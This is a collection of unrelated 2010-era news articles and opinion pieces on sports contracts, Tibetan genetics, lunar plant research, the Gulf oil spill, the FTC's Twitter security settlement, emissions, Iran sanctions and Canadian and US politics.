It means confronting the myth of " Palestinian archeology , " and " Palestinian society and culture , " and building authentic nationalism , institutions and structures with transparency .
It also means , of course , ending the conflict , an end to terrorism as official policy , an end to the civil war between Islamists and secularists , between tribes and clans , an end to corruption and lawlessness , the establishment of a truly democratic government .
No artificial construct imposed from outside can replace the establishment of a genuine process of nation - building from inside .
Ironically , " Palestinianism " is the greatest obstacle to a Palestinian state alongside Israel and regional stability .

SAN JUAN , P.R. —
One year from today , the Mets will add to their payroll a 47 - year - old , past - his - prime power hitter who has a reputation as a malcontent — a player who has been retired from professional baseball for nine years and wo n't play another game again .
Nevertheless , starting on July 1 , 2011 , Bobby Bonilla will remain on the franchise 's payroll for 25 years , collecting an annual salary of $ 1,193,248.20 .
Those are the terms the Mets agreed to Jan. 3 , 2000 , when they bought out the final year of Mr. Bonilla 's contract .
" That beautiful thing , " he said here Monday .
At his best , Mr. Bonilla was a versatile player and productive hitter during his 16 years in the major leagues .
Seven times , he hit at least 20 home runs in a season .
Four times , he drove in at least 100 runs .
He played third base , first base and the outfield at various stages of his career .
He was on six playoff teams and won a World Series in 1997 with the Florida Marlins .
Tibetans have mutations in numerous genes related to how the body uses oxygen .
A comparison of the genomes of 50 Tibetans and 40 Han Chinese shows that ethnic Tibetans split off from the Han less than 3,000 years ago and since then rapidly evolved a unique ability to thrive at high altitudes and low oxygen levels .
The genome - wide comparison , performed by evolutionary biologists at the University of California , Berkeley , uncovered more than 30 genes with DNA mutations that have become more prevalent in Tibetans than Han Chinese , nearly half of which are related to how the body uses oxygen .
One mutation in particular spread from fewer than 10 percent of the Han Chinese to nearly 90 percent of all Tibetans .
" This is the fastest genetic change ever observed in humans , " said Rasmus Nielsen , UC Berkeley professor of integrative biology , who led the statistical analysis .
" For such a very strong change , a lot of people would have had to die simply due to the fact that they had the wrong version of a gene . "
The widespread mutation in Tibetans is near a gene called EPAS1 , a so - called " super athlete gene " identified several years ago and named because some variants of the gene are associated with improved athletic performance , Nielsen said .
The gene codes for a protein involved in sensing oxygen levels and perhaps balancing aerobic and anaerobic metabolism .
The new findings could steer scientists to till - now unknown genes that play a role in how the body deals with decreased oxygen , and perhaps explain some diseases , including schizophrenia and epilepsy , associated with oxygen deprivation in the womb , he said .
Nielsen and his colleagues in China and Europe report their findings in the July 2 issue of the journal Science .

Nielsen , a computational evolutionary biologist , mines genomic information to discover genetic changes driven by natural selection as humans and animals have adapted to new environments .
Changes in the frequency of DNA mutations are one clue .
" You look for rapid evolution in genes because there must be something important about that gene forcing it to change so fast , " he said .
" The new finding is really the first time evolutionary information alone has helped us pinpoint an important function of a gene in humans . "
Adaptation to low oxygen levels has allowed many peoples , from Andeans to Tibetans , to live at high altitude .
When people from lower elevations move above about 13,000 feet , where oxygen levels are about 40 percent lower than at sea level , they typically tire easily , develop headaches , produce babies with lower birth weights and have a higher infant mortality rate .
Tibetans have none of these problems , despite lower oxygen saturation in the blood and lower hemoglobin levels .
Hemoglobin , which gives blood its red color , binds and transports oxygen to the body 's tissues .
Nielsen used genome data produced by the Beijing Genomics Institute ( BGI ) in Shenzhen , China 's flagship genome center , to tease out the genetic changes associated with these physiological changes .
" We 're looking for footprints of past selection to find something functional in our genome , " Nielsen said
BGI researchers obtained DNA from 50 Tibetans living in the Tibet Autonomous Region of China and 40 Han Chinese from Beijing .
The Tibetans lived in two villages located at elevations of 4,300 meters ( 14,100 feet ) and 4,600 meters ( 15,100 feet ) .
All reported at least three generations of ancestors had lived at the same site .
After obtaining informed consent , the Chinese researchers took blood samples from the participants and measured oxygen saturation , red blood cell concentration and hemoglobin content in their blood .
advertisement
Back in the lab , the BGI team isolated only the active genes , or exons , from each individual , then used next - generation sequencing technology to sequence these so - called exomes .
This involved cutting the DNA into many short pieces , sequencing each about 18 times with state - of - the - art Illumina sequencing machines , and then using overlaps to help reassemble the complete genome of each person .
That work was directed by Jun Wang of BGI and the University of Copenhagen in Denmark .
Nielsen and post - doctoral fellows John E. Pool , Emilia - Huerta Sanchez and Nicolas Vinckenbosch conducted the analysis at UC Berkeley , locating all point mutations , called single - nucleotide polymorphisms ( SNPs ) , in the 90 genomes and then comparing Tibetan and Han separately to a control group of 100 Europeans ( Danes ) .
The analysis revealed that the common ancestors of Tibetans and Han Chinese split into two populations about 2,750 years ago , with the larger group moving to the Tibetan plateau .
That group eventually shrank , while the low - elevation Han population expanded dramatically .
Today , the Han Chinese are the dominant ethnic group in mainland China .
The Tibetan branch either merged with the people 's already occupying the Tibetan plateau , or replaced them .
" We ca n't distinguish intermixing and replacement , " Nielsen said .
" The Han Chinese and Tibetans are as different from one another as if the Han completely replaced the Tibetans about 3,000 years ago . "
The Tibetan and Han Chinese genomes are essentially identical in terms of the frequency of polymorphisms in the roughly 20,000 genes , though some 30 genes stood out because of dramatic differences between the Tibetans and the Han .
" We made a list of the genes that changed the most , " Nielsen said , " and what was fascinating was that , bing ! , at the top of that list was a gene that had changed very strongly , and it was related to the response to oxygen . "
The SNP with the most dramatic change in frequency , from 9 percent in Han Chinese to 87 percent in Tibetans , was associated with lower red blood cell count and lower hemoglobin levels in Tibetans .
That variation occurred near a gene called EPAS1 , which earlier studies suggest is involved in regulating hemoglobin in the blood as a response to oxygen levels .
The mutation may be in a transcription factor that regulates the activity of EPAS1 .
Tibetans carrying only one allele with this mutation had about the same hemoglobin concentration as Han Chinese , but those with two mutated alleles had significantly lower hemoglobin concentration .
However , they all have about the same oxygen concentration in the blood .
For some reason , individuals with two copies of the mutation function well in high altitude with relatively low hemoglobin concentration in their blood .
The mutation seems to provide an alternative inborn mechanism for dealing with the low oxygen levels , Nielsen said .
Other strongly selected variants were near the genes for the fetal and adult versions of the globin genes , which produce the structural proteins of hemoglobin .
Two other genes showing a dramatic shift in frequency have been linked to anemia , while several other genes have been linked to diseases , including schizophrenia and epilepsy , possibly caused by low oxygen levels in the womb .
A large team of researchers from BGI contributed to the study , some of whom are also associated with the Graduate University of the Chinese Academy of Sciences .
The research was funded by various Chinese , American and Danish organizations , including the U.S. National Institutes of Health and the National Science Foundation .
The sequenced genomes were part of the international 1000 Genomes Project , which now aims to sequence 2,500 human genomes by the end of 2011 .

I think it would be fun to add an achievement system to the Ubuntu Desktop , like is done on Steam and XBox .
The tricky part is tracking various events and finding amusing correlations .
For example , if your screen - saver kicks in 40 times in a single 24 hour period , you could earn the “ Alternating Current ” achievement , indicating that you ’re being repeatedly interrupted all day long :
There are all kind of things to track and correlate .
Miles moved with the mouse , clicks taken , keys pressed , files opened , applications installed , buddies added , IMs received , sent , etc .
There are all kinds of achievements that could be designed that could be used to help people discover how to use Ubuntu , or for just plain humor .
“ Achievement Unlocked : Application Deficit Disorder ” when you uninstall 100 applications you installed in the prior week .
I ’ve been told this might all be very easy to implement with the Gnome Activity Journal ( Zeitgeist ) , but I have n’t had a chance to investigate further .
UPDATE : I can easily imagine this being tracked in CouchDB , synced between systems via UbuntuOne , and could be linked to any other remote APIs that people could dream up , including Launchpad , Forums , REVU , Identi.ca , etc .

Greening The Moon And Mars
Moffett Field CA ( SPX ) Jul 30 , 2010
Future manned missions to the Moon or Mars could use plants as bio-harvesters to extract valuable elements from the alien soils , researchers say .
Now they hope to launch new experiments to follow up on tests done with plants and lunar regolith during NASA 's Apollo program that landed men on the Moon .
Lunar regolith is a loose mixture of dust , soil , broken rock and other related materials that lie on top of solid bedrock .
The Apollo - era research showed that returned lunar samples of the regolith did not have toxins or contain alien life - form contaminants that could threaten plants , animals or humans on Earth .
Yet limited use of the precious lunar regolith meant that scientists could not study how well plants fared when grown in regolith .
" In spite of the fact that we absolutely admire the innovative science done in the Apollo era , the question of whether a plant could grow if you plop a seed in lunar regolith has n't been answered , " said Robert Ferl , a geneticist at the University of Florida in Gainesville .
Ferl and Anna-Lisa Paul , another geneticist at the University of Florida , hope to pick up where the Apollo - era experiments left off .
Renewed research could take advantage of the powerful tools developed in the past several decades for studying molecular biology and genetics , and see how plants react on a molecular level by turning on or off their genes in response to regolith .
New studies could also push the potential shown in how plants apparently derived some nutrients from lunar regolith .
That could go beyond the dreams of lunar agriculture to transform plants into planetary harvesters , and ultimately help sustain human bases on alien soil .
" It 's not just about using lunar and Mars regolith to grow plants , " Paul explained .
" It 's about capturing nutrients that might otherwise be lost to us . "
The review study of Apollo - era plant experiments was detailed in the April issue of the journal Astrobiology .
Safety first
NASA took great precautions with samples returned during the first manned missions to the Moon by building the Lunar Receiving Lab ( LRL ) at the Johnson Space Center in Houston .
The LRL facility 's design intended to ensure that no dangerous contaminants or unknown alien life forms escaped to threaten Earth 's biosphere , even as researchers began carrying out biological experiments with the lunar regolith .
Any planetary protection fears faded quickly as the first studies showed that plants did not wither and die from contact with lunar samples .
About 35 plant species remained in good health after lunar samples from the Apollo 11 and 12 missions had been rubbed onto the leaves and placed at their base .
Similarly , animals did not suffer from any ill effects during exposure to lunar samples .
In fact , one study found that germinated seedlings and plant cultures seemed to enjoy nutritional benefits from the lunar samples .
The lunar dust and regolith contained certain elements useful for plant growth , such as iron , magnesium and manganese , even if it mostly lacked necessary elements such as nitrogen , phosphorus , sulfur and potassium .
That pointed to the possibility of using plants to biologically harvest nutrients or minerals from the Moon , and suggested that lunar farms could contribute to life - support beyond just feeding astronauts .
" In one interesting model put out a few years ago , plants would live in low - pressure pods on the surface , " Ferl said .
" Astronauts or lunar colonists would go out in pressure suits to capture them . "
Taking the next step
The plants may have survived and even thrived a small sprinkling or rubbing of lunar material , but researchers say many unknowns remain after the last lunar soil experiments that took place 30 years ago .
For instance , none of the Apollo - era experiments examined how lunar material affected the microorganisms such as bacteria or fungi that normally assist plants in harvesting nutrients .
Even microbes from human astronauts might interact with the plant roots in the region of soil known as the rhizosphere .
" You have the colonization of the plant roots by a host of organisms that break down and transport materials , " Paul said .
" These things facilitate the harvesting of molecules from the substrate in which the plant is growing . "
New experiments do n't need to wait for a return trip to the Moon , according to the researchers .
They already have plans that would require just a few grams of the hundreds of kilograms of lunar regolith collected by NASA .
Just one gram of lunar regolith could support the growth of several Arabidopsis plants related to cabbage and radish , Paul pointed out .
That model organism represented the first plant to have its genome sequenced , and so would provide a great baseline for lunar biology experiments .
From Earth to the Moon and Mars
Those experiments would not only answer questions about basic plant biology , but also provide the seeds of knowledge for developing ecology off of Earth .
" One goal is to use plants for life - support and find out the best means to do that , and [ figure out if ] plants use lunar resources to do that , " Ferl said .
" The other question is what the limits of terrestrial life are , and does the Moon 's surface represent a place that terrestrial biology can inhabit . "
That approach could also help tackle problems related to growing plants in Martian regolith .
Some studies on Earth have already tested plant growth in Mars - simulant regolith augmented with certain chemicals , even if a Martian sample has yet to reach Earth .
In the end , the same need to use all available resources and help sustain human colonists would become even greater for a trip to Mars .
" Going to Mars is so much more difficult , because the concept of taking all your resources with you for the whole trip becomes more difficult , " Paul said .
" The drivers that would point toward using plants for life support actually become more crucial . "
Planting the seeds
More Earth experiments also could help engineers and scientists better design future orbital or extraterrestrial farms .
" Testing on extreme environments on Earth could be very useful to identify critical design aspects to be fixed prior to build and fly a demonstration system on the [ International Space Station ] , " said Claudio Finetto , an engineering consultant for Thales Alenia Space - Italia in Torino , Italy .
Finetto and colleagues Cesare Lobascio and Alessandro Rapisarda calculated that a bio- regenerative life support system with just 20 percent of food re-supplied from Earth would become more convenient for an 18 - person moon base inhabited for longer than five years , as opposed to relying on complete food re-supply from Earth .
Their work is detailed in the May - June issue of the journal Acta Astronautica .
The Lunar FARM concept also grew out of a post - graduate course in SpacE Exploration and Development Systems ( SEEDS ) Second Edition at Politecnico di Torino , where Finetto worked with Salvatore Cusumano , Daniele Renzoni , Amir Sabbagh and Cosimo Sinesi .
Even if NASA has scrapped immediate plans to return to the Moon , Finetto agreed that a manned Mars mission could benefit from a self - sustaining approach .
He added that a spacecraft greenhouse could support astronauts on the Martian surface just as easily as during the six - month journeys to and from the red planet .
More advanced robots could also reduce the amount of time human astronauts spend on cultivating their plants , according to Finetto .
That still looks a long way off from the Apollo - era experiments with bits of lunar regolith sprinkled atop plants .
But someday , robots could maintain a self - sustaining greenhouse orbiting above Mars as human explorers focus on science and exploration down on the surface below .
Some Gulf Lawmakers With Ties to Oil Industry Downplay Spill in Their Own Backyard
Created : May 05 , 2010 06:00 | Last updated : July 31 , 2020 00:00
Sen. Mary Landrieu ( D - La . ) ( WDCpix )
Last week — as thousands of barrels of oil were gushing each day from an uncapped well on the floor of the Gulf of Mexico — Sen. Mary Landrieu ( D - La. ) took to the chamber floor to say that she did n’t want “ to minimize ” the severity of the disaster .
Then she spent the next 20 minutes doing just that .
[ Environment1 ]
The slick , Landrieu said , contains “ only 3 percent ” thick emulsified crude that exists as “ a very thin layer ” — only as thick as “ a couple of strands of hair . ”
The 5,000 barrels spilling out each day , she noted , represent “ less than one - fourth of 1 percent ” of the nation ’s daily consumption .
Relative to that requirement “ the industry spill rate is quite low , ” she argued .
“ It is more risky to import our oil in tankers than it is to drill for it offshore , even considering this disaster that we ’re dealing with today , ” Landrieu said .
“ Retreat is not an option . …
We must continue to drill . ”
On one hand , that message has stumped environmentalists , government watchdogs and some of Landrieu ’s own Democratic colleagues , who are pointing to the ongoing disaster as clear reason why policymakers should abandon any plans to expand offshore drilling and focus instead on cleaner energy alternatives .
On the other , the oil industry is a powerful economic engine in Louisiana , and has n’t been shy about showering the state ’s congressional delegation with campaign cash .
Indeed , the more than $ 758,000 Landrieu has accepted from the industry over her Capitol Hill tenure ranks 10th among all active lawmakers .
Even following the worst drilling disaster in decades — even though the spill rests in Landrieu ’s backyard — clean - energy advocates are n’t counting on the Louisiana Democrat for any serious support on drilling reform .
“ There ’s a reason why [ corporations ] contribute money into the political process , ” said Tyson Slocum , head of the energy program at Public Citizen , a government watchdog group .
“ They ’re giving money , not out of charity , but for the promotion of their own self interests .
It ’s with the explicit intention of getting something in return . ”
Landrieu ’s office this week denied that the industry ’s financial backing has swayed her position on energy policy .
“ Campaign contributions , from energy companies or from environmental groups , have absolutely no impact on Sen.
Landrieu ’s policy agenda or her response to this unprecedented disaster in the Gulf , ” a spokeswoman told OpenSecretsblog , which noted that Landrieu had received more campaign money from British Petroleum — the owner of the leaking Gulf well – than any other lawmaker in the last election cycle .
Landrieu , of course , is hardly the only defender of the oil industry , nor is she alone in downplaying the severity of the spill .
Louisiana ’s other upper - chamber lawmaker , GOP Sen .
David Vitter , has also taken steps to protect the industry in the wake of the disaster .
Vitter has called to increase the flow of money from Washington , to delay the Senate ’s investigation into the spill , and to relieve BP of some of the responsibility for immediate cleanup .
“ BP is spread too thin in trying to both cap the well and remediate the damage along the coastline , producing an inefficient and ineffective response , ” he said last week in a statement .
Vitter has accepted more than $ 766,000 from the oil and gas industries in his career , placing him just ahead of Landrieu among active lawmakers .
There are others .
Rep. Gene Taylor ( D - Miss. ) , after flying over the spill last weekend , came to the conclusion that the damage posed by the accident “ is not Armageddon . ”
“ The oil spill is certainly bad .
And it ’s terrible that there ’s a spill out there , ” Taylor said .
“ But I would remind people that the oil is twenty miles from any marsh .
The spill starts breaking up in smaller pieces naturally . ”
Not everyone agrees .
Several of Landrieu ’s Democratic colleagues on Tuesday introduced legislation that would force oil companies to pay more for damages following oil spills like that afflicting the Gulf .
Sponsored by Sens. Bill Nelson ( Fla. ) , Robert Menendez ( N.J. ) and Frank Lautenberg ( N.J. ) , the bill would hike the industry ’s liability cap for such damages from $ 75 million to $ 10 billion .
“ Oil companies must be held responsible for every cost related to an oil spill , ” Lautenberg said , “ and that includes both the environmental and economic damages . ”
In Landrieu ’s eyes , such damages are a small price to pay for the privilege of harvesting the oil and gas from within our own borders .
“ No one has ever claimed , including myself , who ’s an unabashed proponent of the industry , that drilling is risk free , ” she said .

Confessions of ' Bizarre Foods ' Eater
He goes anywhere and eats anything ( usually ) without hesitation
July 27 , 2010  -- Andrew Zimmern 's day job comes with a unique list of occupational hazards , but he manages to keep a good sense of humor about it .
One has to , if they 're in the business of eating things most people would cringe at .
" The fact that I 've had 60 or 70 types of animal penis and testicles actually in my mouth at one time is a huge amusement to many people , " said the 49 - year - old chef and host of the Travel Channel 's " Bizarre Foods . "
" To me , I 'm just curious , I 'm just hoping one day to find one that 's actually good , " he said and added , " but size does matter .
The bigger ones cook better and end up having a better flavor . "
See the entire story tonight on ' Nightline ' at 11:35 p.m. ET
The premise of " Bizarre Foods " involves Zimmern traveling the world to seek out and dish out the strangest of delicacies .
He basically goes everywhere and eats everything , attempting to sample dishes in their own native regions , wherever that may be .
In his excursions , Zimmern estimates he 's been to 80 countries and has sampled 15 different types of rats , 100 different types of bugs , and every single part of a cow , including the bile sack and even its blood – straight from the animal itself .
" I mean , literally , we nicked a cow 's artery , filled a jug , took mud and feces to stop the bleeding and drank the jug in the field with these Tanzanian warriors , " he said .
" That 's what they drink before they go to work every morning of the year . "
Clearly , not your average cup of morning joe , but as Zimmern likes to say , one man 's weird is another man 's wonderful .
" The world is small -- do n't practice contempt prior to investigation , " he said .
" Life 's too short .
We balk at things we know nothing about . "
It is through embracing this philosophy that brought Zimmern along a path that was tumultuous at times .
Zimmern began his culinary career at 14 , working nights in restaurants while many of his peers worked landscaping jobs .
" I did n't want to be at the beach every day where the cute girls were , " he said .
" I wanted to be where the other cute girls were at night -- in the restaurants . "
A Dark Turn
After college , Zimmern 's journey into cuisine took a dark turn when he became heavily involved with drugs .
He said his situation became bleak and he described squatting in an abandoned building in lower Manhattan .
He survived for an entire year by stealing purses and selling the passports and credit cards to support his drug and alcohol habit .
" I was the guy you crossed the street to avoid if you walked by me in New York , " he said .
He said that time was a very low point in his life .
" You 're living the life where you are constantly beat up , abused , abusing other people , doing something horrifically shameful , and tawdry things that crater your soul , " he said .
" You give away pieces of yourself that you swear you would never do . "
He talked about stealing wallets from friends ?
" Those are the things that you do when you are being driven by the insanity and the compulsion of alcohol and drug addiction , " he said .
Zimmern credits his friends with saving his life : they put him on a plane to the Hazelden Addiction Treatment Center in Minnesota in 1982 .
He 's been sober ever since .
Following his treatment , Zimmern opted to stay in Minnesota , and became a real force in the culinary culture as a chef for the Minneapolis café Un Deux Trois , where his menus received the highest acclaim .
He established himself as a food writer and radio personality in the Twin Cities .
Although Zimmern is n't proud of that dark period in his life , he said that it 's become part of who he is today .
" Any decision that I make , anything that I do , every single consideration of my day goes through the prism of what my former experience has been , " he said .
" I have a life based on completely different principles now , and I try to stick with those . "
" I think it has been the secret to my success , " he said .
" Bizarre Foods " is now in its fifth season , and in May Zimmern was awarded the TV Food Personality Award from the James Beard Foundation , the nation 's most prestigious award for culinary professionals .
Rules to Eat By
These days , he lives and eats by just a few rules .
Rule number one is to always try something twice .
As for rule number two , " Never tell someone that has cooked something that their food sucks , " he said .
After three years on the job , and who knows what all that has been in his mouth , Zimmern says he has never gotten sick .
Despite a diet that includes tongue tacos or stomach soup , Zimmern insists that he is a normal eater .
" Regular viewers of the program know , I love something , I 'll look at the camera and say ' this is the best donut hole I 've ever eaten , ' he said .
And if he does n't like something ?
" I look at the coffee and say , ' This is very interesting .
Thank you , '" he said .
" I will play Russian roulette with some food .
But I wo n't play Russian roulette where the gun is loaded in every chamber at very high caliber , " he said .
Zimmern said he does the draw the line at one thing : he wo n't eat human beings .
Everything else , however , is some potentially good eatin . '
The 405 Freeway is closed in both directions between Venice Boulevard and the 10 Freeway after a CHP officer was involved in a crash .
The motorcycle officer was taken to a nearby hospital in critical condition after the 8:35 a.m. crash Wednesday on the northbound 405 Freeway near National Boulevard , said CHP spokesman Francisco Villalobos .
The cause of the crash was under investigation .
“ We 're kind of sketchy right now , ” Villalobos said .
“ That freeway is going to be closed off for quite a while while we do the investigation . ”
He estimated the freeway would be closed for one to two hours while investigators work the scene .

Twitter has reached a settlement with US regulators over a privacy breach that allowed hackers to access the accounts of then president - elect Barack Obama and others and send out phony messages .
Under the settlement with the Federal Trade Commission ( FTC ) , the popular San Francisco - based micro-blogging service must establish an independently audited “ comprehensive information security program , ” the FTC said .

Twitter is also barred for 20 years from “ misleading consumers about the extent to which it maintains and protects the security , privacy , and confidentiality ” of its users .
“ When a company promises consumers that their personal information is secure , it must live up to that promise , ” said David Vladeck , director of the FTC ’s bureau of consumer protection .
“ Serious lapses in the company ’s data security allowed hackers to obtain administrative control of Twitter … and the ability to send out phony tweets pretending to be from then - president - elect Barack Obama and Fox News , among others , ” the FTC said .
It said a hacker used a password - guessing tool to gain administrative control of Twitter in January 2009 and reset numerous user passwords , posting some of them on a website where other people could access them .
“ Using these fraudulently reset passwords , other intruders sent phony tweets from approximately nine user accounts , ” the FTC said .
ADVERTISEMENT
“ One tweet was sent from the account of then - president - elect Barack Obama , offering his more than 150,000 followers a chance to win 500 dollars in free gasoline , ” it said .
In an April 2009 breach , a hacker compromised a Twitter employee ’s personal e-mail account , gaining access to private user information and messages for any Twitter users .
“ Twitter was vulnerable to these attacks because it failed to take reasonable steps to prevent unauthorized administrative control of its system , ” the FTC said .

The FTC said the case was its 30th targeting faulty data security and its first against a social networking service .
The micro-blogging service has exploded in popularity since it was launched in March 2006 and Twitter chief operating officer Dick Costello said recently that it now attracts 190 million visitors a month .

When historians look back on this period , they will see it as another progressive era .
It is not a liberal era  when government intervenes to seize wealth and power and distribute it to the have - nots .
It ’s not a conservative era , when the governing class concedes that the world is too complicated to be managed from the center .
It ’s a progressive era , based on the faith in government experts and their ability to use social science analysis to manage complex systems .
This progressive era is being promulgated without much popular support .
It ’s being led by a large class of educated professionals , who have been trained to do technocratic analysis , who believe that more analysis and rule - writing is the solution to social breakdowns , and who have constructed ever - expanding networks of offices , schools and contracts .
Already this effort is generating a fierce , almost culture - war - style backlash .
It is generating a backlash among people who do not have faith in Washington , who do not have faith that trained experts have superior abilities to organize society , who do not believe national rules can successfully contend with the intricacies of local contexts and cultures .
This progressive era amounts to a high - stakes test .
If the country remains safe and the health care and financial reforms work , then we will have witnessed a life - altering event .
We ’ll have received powerful evidence that central regulations can successfully organize fast - moving information - age societies .
If the reforms fail  if they kick off devastating unintended consequences or saddle the country with a maze of sclerotic regulations  then the popular backlash will be ferocious .
Large sectors of the population will feel as if they were subjected to a doomed experiment they did not consent to .
They will feel as if their country has been hijacked by a self - serving professional class mostly interested in providing for themselves .
If that backlash gains strength , well , what ’s the 21st - century version of the guillotine ?
Greenhouse gas emissions from rich countries fell a record 7 % in 2009 because of the recession , but the cut was entirely nullified by steep increases from fast - growing China and India , according to one of Europe 's leading scientific research groups .
Overall , this meant annual global climate emissions remained steady for the first time since 1992 , says the Netherlands Environmental Assessment Agency which drew on energy - use data from the US government , the EU , BP energy data , the cement industry , and elsewhere .
But the Dutch government - funded agency , which in 2007 was the first to correctly identify that China had overtaken the US as the world 's greatest greenhouse gas polluter , warned that the figures did not mean that rich countries had cleaned up their act .
" A large part of production capacity has been suspended , but this could be re-employed as soon as the economy improves .
It is likely that a recovering economy would cause emission levels in industrialised countries to go up .
Nevertheless , the economic downturn has meant that these countries can meet their reduction obligations with more ease , " said NEAA spokeswoman Anneke Oosterhuis .
" Another consequence of this downturn is that some industrialised countries may need to purchase fewer emission rights from reduction projects in developing countries , which , in turn , means that there will be less money available for emission reductions in those developing countries , " said Oosterhuis .
The figures will come as a relief to the world 's rich countries which – the US aside – are legally committed to reducing emissions by a collective 5.2 % on 1990 figures by 2012 .
As it stands , says the Dutch agency , they are now 10 % below 1990 levels , well below the Kyoto target level .
The research also shows that China and India 's average CO2 emissions per inhabitant are still well below those in industrialised countries .
In India the emissions are now 1.4 tonnes per person and in China 6 tonnes , compared with 10 tonnes per person in the Netherlands and 17 tonnes in the United States .
China's 9 % growth in emissions came despite its doubling of wind and solar energy capacity for the fifth year in a row .
The report highlights the rapid growth in global emissions in the past 40 years .
They are now 25 % higher than in 2000 , almost 40 % more than in 1990 , and double 1970 's figure of 15.5 bn tonnes .
The big growth in Chinese and Indian emissions has been relatively recent .
China has doubled its emissions in nine years , and India 's have risen by 50 % in that time .
But the recession has not hit all industrial countries uniformly .
Russia ( - 11 % ) and Japan ( - 9 % ) have contracted their energy use the most , but the US – which is by far the most profligate power user in the world – reduced its emissions by nearly 500m tonnes in 2009 .
Other developing countries changed little in 2009 .
Emissions rose in Iran , Indonesia and South Korea but fell in Brazil , Saudi Arabia , South Africa and Taiwan .
2009 was a good year for renewable energy .
Global wind power capacity grew by nearly one third , with nearly one third of all new installations in China .
Total solar electricity installed in 2009 was 46 % up on 2008 .
China now leads the world in large - scale hydropower with 19 % of global production , well ahead of Brazil and the USA with a 12 % share each .
The new figures supplement those of the International energy agency ( IEA ) which predicted in November 2009 that global CO2 emissions would decrease by 2.6 % in 2009 .
At that stage it was unclear how China and India would ride out the recession .
Ahmadinejad 's regime could suffer the same fate as the deposed Shah .
Russia turned on Iran , accusing it of " fruitless and irresponsible rhetoric " and adding its voice to a diplomatic assault Monday which included unilateral sanctions from both the EU and Canada , as well as warnings from Iran 's opposition party that
The Russian remark came after criticism from Tehran over Moscow 's support for UN sanctions last month .
In the past , Iran had depended on allies Russia and China — and their veto power at the Security Council — to block tough penalties , but Russia sided with the US and its allies and endorsed the sanctions , levied in a bid to force Iran to halt its nuclear ambitions .
The Russian Foreign Ministry suggested " Iran 's leaders take concrete and constructive steps to work the situation out . "
The European Union and Canada formally adopted unilateral sanctions against Iran earlier Monday which target the country 's energy , banking , and foreign trade sectors .
The move came on the heels of the The move came on the heels of the unilateral US sanctions passed last month by the Senate .
The EU sanctions were agreed to in principle by European leaders in June , and are the latest in a series of measures taken by the international community in an effort to halt Iran 's nuclear program .
June 's sanctions showed signs of affecting Iran 's airline industry .
In Canada , Foreign Affairs Minister Lawrence Cannon said the country 's new measures will include a ban on any new Canadian investment in Iran 's oil and gas sector , and restrictions on exporting goods that could be used in nuclear programs .
" We have a comprehensive set of sanctions .
This is something where we have all 27 countries working together , " EU foreign policy chief Catherine Ashton said ahead of the meeting .
In Canada , Foreign Affairs Minister Lawrence Cannon said the country 's new measures will include a ban on any new Canadian investment in Iran 's oil and gas sector , and restrictions on exporting goods that could be used in nuclear programs .
Canadian Prime Minister Stephen Harper explained Canada 's sanctions , saying " These sanctions are in no way intended to punish the Iranian people , " said Canadian Prime Minister Stephen Harper .
" These targeted measures are designed to hamper attempts by Iran to develop nuclear , chemical , biological and missile programs " and to persuade the country to engage in negotiations .
An Iranian Foreign Ministry spokesman dismissed the sanctions , saying they " will not affect Iran , " and only " complicate the situation and push the sides further away from reaching agreement . "
The RCMP has ended its inquiries into MP and former cabinet minister Helena Guergis and her husband , Rahim Jaffer , concluding there 's no evidence of criminal wrongdoing by either , their lawyers said Wednesday .
" All concerns relating to Ms. Guergis have been resolved and no issues remain outstanding , " Guergis 's lawyer , Howard Rubel , said in a statement .
Rubel said his client still does n't know what she was accused of adding that the RCMP concluded its investigation without interviewing her .
" There was nothing for Ms. Guergis to answer , " Rubel said .
" They did n't have to ask her to explain anything .
They did n't have any questions for her at all after looking into these issues and I think that speaks volumes . "
Jaffer 's lawyer , Frank Addario , said the Mounties informed him " there is no evidence to support a criminal charge and it will be closing the portion of its file that relates to Mr. Jaffer . "
" He was relieved naturally enough to know that an RCMP investigation had concluded and determined there was no evidence whatsoever of any criminal wrongdoing on his part , " Addario said .
Guergis resigned from Prime Minister Stephen Harper 's cabinet and was kicked out of the Tory caucus in April after the prime minister learned of " serious " allegations about her conduct .
Harper referred the matter to the Mounties and the federal ethics commissioner .
Guergis , who remains the MP for the central Ontario riding of Simcoe - Grey , has steadfastly denied any wrongdoing .
But sources within the Prime Minister 's Office told CBC News it does not affect Harper 's decision to expel Guergis from caucus .
The sources said there were " several factors " that led to her expulsion , including conduct unbecoming for a parliamentarian or minister of the Crown , failure to disclose her mortgage , and the use of her office by Jaffer , a former Conservative MP .
Ethics probe continues
Guergis still faces a probe by Ethics Commissioner Mary Dawson over whether a letter she wrote promoting a waste management company to local officials in her riding violated the Conflict of Interest Act .
In a letter dated Sept. 9 , 2009 , Guergis wrote to her cousin , the warden of Simcoe County , and the county council , encouraging them to consider a presentation by a constituent of hers , Jim Wright , owner of Wright Tech Systems Inc. in Richmond Hill , Ont .
" I feel it is my responsibility to encourage you to consider this presentation about alternative waste management technology , " Guergis wrote in the letter , which is on Simcoe County 's website .
Guergis has since said she felt it was her " obligation " to support Wright 's initiative as his MP and as someone opposed to a proposed new landfill site to handle the county 's growing waste disposal needs .
Jaffer has been accused of trying to use his connections to former colleagues in the Conservative government to gain access to a federal green infrastructure fund for several businesses .
Documents show some staff and parliamentary secretaries of cabinet ministers , including Public Works Minister Christian Paradis and Transport Minister John Baird , treated Jaffer 's inquiries about the fund on a priority basis .
Jaffer , who is not registered as a lobbyist , has denied conducting unregistered lobbying or receiving a penny of federal funds .
White House Press Secretary Robert Gibbs showed poor press management skills in handling the whole Shirley Sherrod saga .
He allowed the media frame to shift quickly to the missteps of the administration rather than emphasizing the underhanded , contrived , and racist actions of Andrew Breitbart and his fellow travelers at Fox News .
Instead of explaining to the press why decent people in this country should be shocked and outraged at Mr. Breitbart ’s smear tactics that dragged the good name and reputation of an excellent public servant through the mud , Gibbs offered a mealy - mouthed “ apology ” on behalf of the White House .
The apology then became the story , not Breitbart .
Gibbs ’s handling of the episode enabled the mainstream media to turn on a dime from looking at Breitbart ’s motives and tactics to asking the question : “ Why did the Obama administration act so hastily in firing Sherrod ? ”
It ’s a legitimate question that reporters would ask in any case , but Gibbs could have kept the focus on the smearer instead of the smearee .
Gibbs should have hit back at Breitbart and his soul mates at Fox News and AM talk radio for lying about Sherrod and manipulating the video to falsify her words .
What would Ari Fleischer or Tony Snow do if they had faced a similar controversy involving a demonstrably false accusation coming from the extremist end of the blogosphere ?
Apologize on behalf of the President ?
Hardly .
They ’d hit back at its source and hit back hard .
